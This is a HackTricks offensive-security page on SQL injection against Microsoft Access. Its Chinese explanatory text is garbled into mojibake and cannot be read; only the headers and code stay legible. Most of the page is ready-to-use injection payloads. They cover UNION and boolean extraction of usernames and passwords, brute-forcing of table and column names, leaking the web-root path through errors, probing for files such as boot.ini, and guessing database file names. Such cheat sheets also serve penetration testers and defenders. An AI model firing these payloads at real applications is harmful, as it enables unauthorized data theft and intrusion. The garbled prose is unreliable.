# MS Access SQL Injection

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## åœ¨çº¿æ¸¸ä¹åœº

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## æ•°æ®åº“é™åˆ¶

### å­—ç¬¦ä¸²è¿æ¥

å­—ç¬¦ä¸²è¿æ¥å¯ä»¥ä½¿ç”¨ `& (%26)` å’Œ `+ (%2b)` å­—ç¬¦ã€‚
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### Comments

åœ¨ MS Access ä¸­æ²¡æœ‰æ³¨é‡Šï¼Œä½†æ˜¾ç„¶å¯ä»¥é€šè¿‡ NULL å­—ç¬¦åˆ é™¤æŸ¥è¯¢çš„æœ€åéƒ¨åˆ†ï¼š
```sql
1' union select 1,2 from table%00
```
å¦‚æœè¿™ä¸èµ·ä½œç”¨ï¼Œæ‚¨å¯ä»¥å§‹ç»ˆä¿®å¤æŸ¥è¯¢çš„è¯­æ³•ï¼š
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Stacked Queries

å®ƒä»¬ä¸è¢«æ”¯æŒã€‚

### LIMIT

**`LIMIT`** æ“ä½œç¬¦ **æœªå®ç°**ã€‚ä½†æ˜¯ï¼Œå¯ä»¥ä½¿ç”¨ **`TOP` æ“ä½œç¬¦** å°† SELECT æŸ¥è¯¢ç»“æœé™åˆ¶ä¸º **å‰ N è¡Œ**ã€‚`TOP` æ¥å—ä¸€ä¸ªæ•´æ•°ä½œä¸ºå‚æ•°ï¼Œè¡¨ç¤ºè¦è¿”å›çš„è¡Œæ•°ã€‚
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
å°±åƒ TOP ä¸€æ ·ï¼Œä½ å¯ä»¥ä½¿ç”¨ **`LAST`** æ¥è·å– **æœ€åçš„è¡Œ**ã€‚

## UNION æŸ¥è¯¢/å­æŸ¥è¯¢

åœ¨ SQLi ä¸­ï¼Œä½ é€šå¸¸ä¼šæƒ³ä»¥æŸç§æ–¹å¼æ‰§è¡Œä¸€ä¸ªæ–°æŸ¥è¯¢ï¼Œä»¥ä»å…¶ä»–è¡¨ä¸­æå–ä¿¡æ¯ã€‚MS Access æ€»æ˜¯è¦æ±‚åœ¨ **å­æŸ¥è¯¢æˆ–é¢å¤–æŸ¥è¯¢ä¸­æŒ‡æ˜ `FROM`**ã€‚\
å› æ­¤ï¼Œå¦‚æœä½ æƒ³æ‰§è¡Œ `UNION SELECT` æˆ– `UNION ALL SELECT` æˆ–åœ¨æ¡ä»¶ä¸­ä½¿ç”¨æ‹¬å·çš„ `SELECT`ï¼Œä½ æ€»æ˜¯ **éœ€è¦æŒ‡æ˜ä¸€ä¸ªæœ‰æ•ˆçš„è¡¨åçš„ `FROM`**ã€‚\
å› æ­¤ï¼Œä½ éœ€è¦çŸ¥é“ä¸€ä¸ª **æœ‰æ•ˆçš„è¡¨å**ã€‚
```sql
-1' UNION SELECT username,password from users%00
```
### Chaining equals + Substring

{% hint style="warning" %}
è¿™å°†å…è®¸æ‚¨åœ¨ä¸éœ€è¦çŸ¥é“è¡¨åçš„æƒ…å†µä¸‹æå–å½“å‰è¡¨çš„å€¼ã€‚
{% endhint %}

**MS Access** å…è®¸ **å¥‡æ€ªçš„è¯­æ³•**ï¼Œä¾‹å¦‚ **`'1'=2='3'='asd'=false`**ã€‚é€šå¸¸ï¼ŒSQL æ³¨å…¥å°†ä½äº **`WHERE`** å­å¥ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚

æƒ³è±¡ä¸€ä¸‹ï¼Œæ‚¨åœ¨ MS Access æ•°æ®åº“ä¸­æœ‰ä¸€ä¸ª SQLiï¼Œå¹¶ä¸”æ‚¨çŸ¥é“ï¼ˆæˆ–çŒœæµ‹ï¼‰æŸä¸€ **åˆ—åæ˜¯ username**ï¼Œè€Œè¿™æ˜¯æ‚¨æƒ³è¦ **æå–** çš„å­—æ®µã€‚æ‚¨å¯ä»¥æ£€æŸ¥åœ¨ä½¿ç”¨é“¾å¼ç­‰å·æŠ€æœ¯æ—¶ï¼ŒWeb åº”ç”¨ç¨‹åºçš„ä¸åŒå“åº”ï¼Œå¹¶å¯èƒ½ä½¿ç”¨ **`Mid`** å‡½æ•°é€šè¿‡ **å¸ƒå°”æ³¨å…¥** æå–å†…å®¹ã€‚
```sql
'=(Mid(username,1,3)='adm')='
```
å¦‚æœä½ çŸ¥é“ **è¡¨çš„åç§°** å’Œ **åˆ—** ä»¥è¿›è¡Œè½¬å‚¨ï¼Œä½ å¯ä»¥ä½¿ç”¨ `Mid`ã€`LAST` å’Œ `TOP` çš„ç»„åˆé€šè¿‡å¸ƒå°” SQLi **æ³„éœ²æ‰€æœ‰ä¿¡æ¯**ï¼š
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Feel free to check this in the online playground._

### æš´åŠ›ç ´è§£è¡¨å

ä½¿ç”¨é“¾å¼ç­‰å·æŠ€æœ¯ï¼Œæ‚¨è¿˜å¯ä»¥**æš´åŠ›ç ´è§£è¡¨å**ï¼Œä¾‹å¦‚ï¼š
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ä¸€ç§æ›´ä¼ ç»Ÿçš„æ–¹æ³•ï¼š
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_Feel free to check this in the online playground._

* Sqlmap å¸¸è§è¡¨å: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* å¦ä¸€ä¸ªåˆ—è¡¨åœ¨ [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### æš´åŠ›ç ´è§£åˆ—å

æ‚¨å¯ä»¥ä½¿ç”¨é“¾å¼ç­‰å·æŠ€å·§**æš´åŠ›ç ´è§£å½“å‰åˆ—å**:
```sql
'=column_name='
```
æˆ–ä½¿ç”¨ **group by**ï¼š
```sql
-1' GROUP BY column_name%00
```
æˆ–è€…ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•æš´åŠ›ç ´è§£**ä¸åŒè¡¨**çš„åˆ—åï¼š
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Dumping data

æˆ‘ä»¬å·²ç»è®¨è®ºè¿‡ [**é“¾å¼ç­‰å·æŠ€æœ¯**](ms-access-sql-injection.md#chaining-equals-+-substring) **ä»å½“å‰å’Œå…¶ä»–è¡¨ä¸­è½¬å‚¨æ•°æ®**ã€‚ä½†è¿˜æœ‰å…¶ä»–æ–¹æ³•ï¼š
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
ç®€è€Œè¨€ä¹‹ï¼Œè¯¥æŸ¥è¯¢ä½¿ç”¨â€œif-thenâ€è¯­å¥ä»¥ä¾¿åœ¨æˆåŠŸæ—¶è§¦å‘â€œ200 OKâ€ï¼Œå¦åˆ™è§¦å‘â€œ500 Internal Errorâ€ã€‚åˆ©ç”¨TOP 10è¿ç®—ç¬¦ï¼Œå¯ä»¥é€‰æ‹©å‰åä¸ªç»“æœã€‚éšåä½¿ç”¨LASTä»…è€ƒè™‘ç¬¬åä¸ªå…ƒç»„ã€‚åœ¨è¯¥å€¼ä¸Šï¼Œä½¿ç”¨MIDè¿ç®—ç¬¦ï¼Œå¯ä»¥è¿›è¡Œç®€å•çš„å­—ç¬¦æ¯”è¾ƒã€‚é€šè¿‡é€‚å½“æ›´æ”¹MIDå’ŒTOPçš„ç´¢å¼•ï¼Œæˆ‘ä»¬å¯ä»¥è½¬å‚¨æ‰€æœ‰è¡Œçš„â€œusernameâ€å­—æ®µå†…å®¹ã€‚

### åŸºäºæ—¶é—´

æŸ¥çœ‹ [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN)

### å…¶ä»–æœ‰è¶£çš„å‡½æ•°

* `Mid('admin',1,1)` ä»ä½ç½®1è·å–é•¿åº¦ä¸º1çš„å­å­—ç¬¦ä¸²ï¼ˆåˆå§‹ä½ç½®ä¸º1ï¼‰
* `LEN('1234')` è·å–å­—ç¬¦ä¸²é•¿åº¦
* `ASC('A')` è·å–å­—ç¬¦çš„asciiå€¼
* `CHR(65)` ä»asciiå€¼è·å–å­—ç¬¦ä¸²
* `IIF(1=1,'a','b')` å¦‚æœåˆ™
* `COUNT(*)` è®¡ç®—é¡¹ç›®æ•°é‡

## æšä¸¾è¡¨

ä» [**è¿™é‡Œ**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) æ‚¨å¯ä»¥çœ‹åˆ°è·å–è¡¨åçš„æŸ¥è¯¢ï¼š
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
ç„¶è€Œï¼Œè¯·æ³¨æ„ï¼Œåœ¨æ‚¨**æ— æ³•è®¿é—®è¯»å–è¡¨ `MSysObjects`** çš„æƒ…å†µä¸‹ï¼Œå‘ç° SQL æ³¨å…¥æ˜¯éå¸¸å…¸å‹çš„ã€‚

## æ–‡ä»¶ç³»ç»Ÿè®¿é—®

### Web æ ¹ç›®å½•å®Œæ•´è·¯å¾„

**Web æ ¹ç»å¯¹è·¯å¾„çš„çŸ¥è¯†å¯èƒ½ä¼šä¿ƒè¿›è¿›ä¸€æ­¥çš„æ”»å‡»**ã€‚å¦‚æœåº”ç”¨ç¨‹åºé”™è¯¯æ²¡æœ‰å®Œå…¨éšè—ï¼Œå¯ä»¥é€šè¿‡å°è¯•ä»ä¸€ä¸ªä¸å­˜åœ¨çš„æ•°æ®åº“ä¸­é€‰æ‹©æ•°æ®æ¥æ­ç¤ºç›®å½•è·¯å¾„ã€‚

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access ä¼šè¿”å›ä¸€ä¸ª**åŒ…å« Web ç›®å½•å®Œæ•´è·¯å¾„åçš„é”™è¯¯æ¶ˆæ¯**ã€‚

### æ–‡ä»¶æšä¸¾

ä»¥ä¸‹æ”»å‡»å‘é‡å¯ç”¨äº**æ¨æ–­è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿä¸Šæ–‡ä»¶çš„å­˜åœ¨**ã€‚å¦‚æœæŒ‡å®šçš„æ–‡ä»¶å­˜åœ¨ï¼ŒMS Access ä¼šè§¦å‘ä¸€æ¡é”™è¯¯æ¶ˆæ¯ï¼Œå‘ŠçŸ¥æ•°æ®åº“æ ¼å¼æ— æ•ˆï¼š

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

å¦ä¸€ç§æšä¸¾æ–‡ä»¶çš„æ–¹æ³•æ˜¯**æŒ‡å®šä¸€ä¸ª database.table é¡¹ç›®**ã€‚**å¦‚æœ**æŒ‡å®šçš„**æ–‡ä»¶å­˜åœ¨**ï¼ŒMS Access ä¼šæ˜¾ç¤ºä¸€æ¡**æ•°æ®åº“æ ¼å¼é”™è¯¯æ¶ˆæ¯**ã€‚

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### .mdb æ–‡ä»¶åçŒœæµ‹

**æ•°æ®åº“æ–‡ä»¶å (.mdb)** å¯ä»¥é€šè¿‡ä»¥ä¸‹æŸ¥è¯¢æ¨æ–­ï¼š

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

å…¶ä¸­**name\[i] æ˜¯ä¸€ä¸ª .mdb æ–‡ä»¶å**ï¼Œ**realTable æ˜¯æ•°æ®åº“ä¸­å­˜åœ¨çš„è¡¨**ã€‚å°½ç®¡ MS Access æ€»æ˜¯ä¼šè§¦å‘ä¸€æ¡é”™è¯¯æ¶ˆæ¯ï¼Œä½†å¯ä»¥åŒºåˆ†æ— æ•ˆæ–‡ä»¶åå’Œæœ‰æ•ˆçš„ .mdb æ–‡ä»¶åã€‚

### .mdb å¯†ç ç ´è§£

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html) æ˜¯ä¸€ä¸ªå…è´¹çš„å®ç”¨ç¨‹åºï¼Œå¯ç”¨äºæ¢å¤ Microsoft Access 95/97/2000/XP æˆ– Jet Database Engine 3.0/4.0 çš„ä¸»æ•°æ®åº“å¯†ç ã€‚

## å‚è€ƒæ–‡çŒ®

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
